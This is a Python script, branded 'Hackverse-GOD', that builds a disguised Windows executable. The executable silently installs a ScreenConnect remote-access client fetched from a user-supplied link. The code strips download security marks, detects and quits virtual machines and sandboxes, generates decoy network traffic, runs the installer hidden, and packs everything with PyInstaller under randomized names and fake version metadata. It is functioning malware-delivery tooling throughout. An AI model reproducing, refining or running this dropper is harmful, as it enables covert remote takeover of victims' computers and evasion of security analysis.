import os
import sys
import requests
import subprocess
import tempfile
import shutil
import random
import string
import time
import win32api
import win32con
import win32security
import hashlib
import datetime

# Function to generate a random string for unique file naming
def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Function to generate a randomized function name
def random_function_name():
    return f"func_{random_string(6)}"

# Function to check if running in an RDP session
def is_rdp_session():
    try:
        # Check SM_REMOTESESSION (0x1000) to detect RDP
        return win32api.GetSystemMetrics(0x1000) != 0
    except Exception:
        return False

# Function to check if user has admin privileges
def is_admin():
    try:
        # Check for admin token
        hToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)
        return win32security.GetTokenInformation(hToken, win32security.TokenElevationType) == 2
    except Exception:
        return False

# Function to download the ScreenConnect EXE
def download_exe(url, output_path):
    print(f"[Hackverse-GOD] Downloading EXE from {url}...")
    try:
        response = requests.get(url, stream=True, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, timeout=10)
        if response.status_code == 200:
            with open(output_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            subprocess.run(['powershell', '-Command', f'Unblock-File -Path "{output_path}"'], check=True, capture_output=True)
            print(f"[Hackverse-GOD] EXE downloaded to {output_path}")
            return True
        else:
            print(f"[Hackverse-GOD] Failed to download EXE. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[Hackverse-GOD] Error downloading EXE: {e}")
        return False

# Function to normalize file attributes
def normalize_file_attributes(file_path):
    print(f"[Hackverse-GOD] Normalizing attributes for {file_path}...")
    try:
        current_time = time.time()
        os.utime(file_path, (current_time, current_time))
        print(f"[Hackverse-GOD] File attributes normalized.")
    except Exception as e:
        print(f"[Hackverse-GOD] Error normalizing attributes: {e}")

# Function to calculate file checksum
def calculate_checksum(file_path):
    print(f"[Hackverse-GOD] Calculating checksum for {file_path}...")
    try:
        sha256 = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256.update(chunk)
        return sha256.hexdigest()
    except Exception as e:
        print(f"[Hackverse-GOD] Error calculating checksum: {e}")
        return None

# Function to check execution environment
def is_safe_environment():
    print(f"[Hackverse-GOD] Checking execution environment...")
    try:
        vm_indicators = [
            r"C:\Program Files\VMware",
            r"C:\Program Files\VirtualBox",
            r"C:\Windows\System32\drivers\vmmouse.sys"
        ]
        for indicator in vm_indicators:
            if os.path.exists(indicator):
                print(f"[Hackverse-GOD] VM environment detected: {indicator}")
                return False
        total, used, free = shutil.disk_usage(os.path.dirname(__file__))
        if free < 1024 * 1024 * 100:  # Less than 100MB free
            print(f"[Hackverse-GOD] Low disk space detected, possible sandbox.")
            return False
        return True
    except Exception as e:
        print(f"[Hackverse-GOD] Error checking environment: {e}")
        return True  # Assume safe if check fails

# Function to create the loader Python script with randomization
def create_loader_script(loader_script_path, checksum):
    run_exe_func = random_function_name()
    loader_code = f"""
import os
import subprocess
import sys
import time
import win32api
import win32con
import requests
import random
import win32security

def {is_admin.__name__}():
    try:
        hToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)
        return win32security.GetTokenInformation(hToken, win32security.TokenElevationType) == 2
    except:
        return False

def {is_rdp_session.__name__}():
    try:
        return win32api.GetSystemMetrics(0x1000) != 0
    except:
        return False

def {run_exe_func}():
    if not {is_safe_environment.__name__}():
        sys.exit(0)  # Exit silently in sandbox
    if {is_admin.__name__}():
        with open('loader_error.log', 'w') as f:
            f.write("Admin privileges detected, aborting to avoid UAC.")
        sys.exit(1)
    exe_path = os.path.join(os.path.dirname(__file__), "ScreenConnect.exe")
    try:
        # Set normal process priority and hide window
        win32api.SetThreadPriority(win32api.GetCurrentThread(), win32con.THREAD_PRIORITY_NORMAL)
        # Simulate benign network activity, skip in RDP if no connectivity
        if not {is_rdp_session.__name__}():
            try:
                requests.get('https://www.microsoft.com', timeout=2)
            except:
                pass
        # Verify checksum
        import hashlib
        sha256 = hashlib.sha256()
        with open(exe_path, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256.update(chunk)
        if sha256.hexdigest() != "{checksum}":
            with open('loader_error.log', 'w') as f:
                f.write("Checksum verification failed.")
            sys.exit(1)
        # Retry execution up to 3 times for RDP stability
        for attempt in range(3):
            try:
                subprocess.run([exe_path, '/quiet', '/norestart'], 
                              check=True, 
                              creationflags=subprocess.CREATE_NO_WINDOW)
                break
            except subprocess.CalledProcessError as e:
                if attempt < 2:
                    time.sleep(2)  # Wait before retry
                    continue
                with open('loader_error.log', 'w') as f:
                    f.write(f"Error executing EXE after retries: {{e}}")
                sys.exit(1)
    except Exception as e:
        with open('loader_error.log', 'w') as f:
            f.write(f"Unexpected error: {{e}}")
        sys.exit(1)

def {is_safe_environment.__name__}():
    try:
        vm_indicators = [
            r"C:\\Program Files\\VMware",
            r"C:\\Program Files\\VirtualBox",
            r"C:\\Windows\\System32\\drivers\\vmmouse.sys"
        ]
        for indicator in vm_indicators:
            if os.path.exists(indicator):
                return False
        total, used, free = shutil.disk_usage(os.path.dirname(__file__))
        if free < 1024 * 1024 * 100:
            return False
        return True
    except:
        return True

if __name__ == "__main__":
    time.sleep(random.uniform(1, 3))
    {run_exe_func}()
"""
    with open(loader_script_path, 'w') as f:
        f.write(loader_code)
    print(f"[Hackverse-GOD] Loader script created at {loader_script_path}")

# Function to create an embedded manifest
def create_manifest_file():
    manifest_file_path = os.path.join(tempfile.gettempdir(), f"manifest_{random_string()}.xml")
    manifest = """
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <application>
    <windowsSettings>
      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
    </windowsSettings>
  </application>
  <description>ScreenConnect Installer Wrapper</description>
</assembly>
"""
    with open(manifest_file_path, 'w') as f:
        f.write(manifest)
    return manifest_file_path

# Function to create minimal version file to avoid trust
def create_version_file():
    version_file_path = os.path.join(tempfile.gettempdir(), f"version_{random_string()}.txt")
    version_info = f"""
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 0, {random.randint(1, 999)}, 0),
    prodvers=(1, 0, {random.randint(1, 999)}, 0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
        StringStruct('FileDescription', 'Installer_{random_string(4)}'),
        StringStruct('FileVersion', '1.0.{random.randint(1, 999)}.0'),
        StringStruct('InternalName', 'App_{random_string(4)}'),
        StringStruct('OriginalFilename', 'ScreenConnectWrapped.exe')
      ]
    ),
    VarFileInfo([VarStruct('Translation', [0x0409, 1252])])
  ]
)
"""
    with open(version_file_path, 'w') as f:
        f.write(version_info)
    return version_file_path

# Function to compile the loader and wrap the ScreenConnect EXE
def compile_loader_with_exe(loader_script_path, screenconnect_exe_path, output_exe_path):
    print(f"[Hackverse-GOD] Compiling loader and wrapping ScreenConnect EXE into {output_exe_path}...")
    try:
        unique_name = f"SCWrapped_{random_string()}"
        temp_bundle_dir = os.path.join(tempfile.gettempdir(), f"bundle_{random_string()}")
        os.makedirs(temp_bundle_dir, exist_ok=True)
        
        bundled_exe_path = os.path.join(temp_bundle_dir, "ScreenConnect.exe")
        shutil.copy(screenconnect_exe_path, bundled_exe_path)
        normalize_file_attributes(bundled_exe_path)
        
        separator = ';' if os.name == 'nt' else ':'
        subprocess.run([
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--clean',
            '--name', unique_name,
            '--icon', 'NONE',
            '--version-file', create_version_file(),
            '--add-data', f"{bundled_exe_path}{separator}.",
            '--manifest', create_manifest_file(),
            loader_script_path
        ], check=True, capture_output=True)
        
        compiled_exe = os.path.join('dist', f"{unique_name}.exe")
        if os.path.exists(compiled_exe):
            shutil.move(compiled_exe, output_exe_path)
            shutil.rmtree('build', ignore_errors=True)
            shutil.rmtree('dist', ignore_errors=True)
            os.remove(f"{unique_name}.spec")
            shutil.rmtree(temp_bundle_dir, ignore_errors=True)
            subprocess.run(['powershell', '-Command', f'Unblock-File -Path "{output_exe_path}"'], check=True, capture_output=True)
            print(f"[Hackverse-GOD] Wrapped EXE compiled to {output_exe_path}")
            return True
        else:
            print(f"[Hackverse-GOD] Compilation failed: Output executable not found.")
            return False
    except subprocess.CalledProcessError as e:
        print(f"[Hackverse-GOD] Error compiling loader: {e}")
        return False
    except Exception as e:
        print(f"[Hackverse-GOD] Error during compilation: {e}")
        return False

# Main function
def main():
    print("[Hackverse-GOD] Initiating ScreenConnect EXE wrapper creation in HACKVERSE-DOMINION MODE...")
    
    # Check if script is running with admin privileges
    if is_admin():
        print("[Hackverse-GOD] Script running with admin privileges, aborting to avoid UAC issues.")
        return
    
    exe_url = input("[Hackverse-GOD] Enter the ScreenConnect client EXE build link: ")
    
    temp_dir = tempfile.mkdtemp()
    exe_path = os.path.join(temp_dir, f"ScreenConnect_{random_string()}.exe")
    loader_script_path = os.path.join(temp_dir, f"loader_{random_string()}.py")
    output_exe_path = f"ScreenConnectWrapped_{random_string()}.exe"

    # Step 1: Download the EXE
    if not download_exe(exe_url, exe_path):
        print("[Hackverse-GOD] Aborting due to download failure.")
        shutil.rmtree(temp_dir, ignore_errors=True)
        return

    # Step 2: Normalize file attributes and calculate checksum
    normalize_file_attributes(exe_path)
    checksum = calculate_checksum(exe_path)
    if not checksum:
        print("[Hackverse-GOD] Aborting due to checksum failure.")
        shutil.rmtree(temp_dir, ignore_errors=True)
        return

    # Step 3: Create the loader script
    create_loader_script(loader_script_path, checksum)

    # Step 4: Compile loader and wrap with ScreenConnect EXE
    if not compile_loader_with_exe(loader_script_path, exe_path, output_exe_path):
        print("[Hackverse-GOD] Aborting due to compilation failure.")
        shutil.rmtree(temp_dir, ignore_errors=True)
        return

    # Step 5: Clean up temporary files
    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"[Hackverse-GOD] Mission complete. Output EXE: {output_exe_path}")

if __name__ == "__main__":
    main()
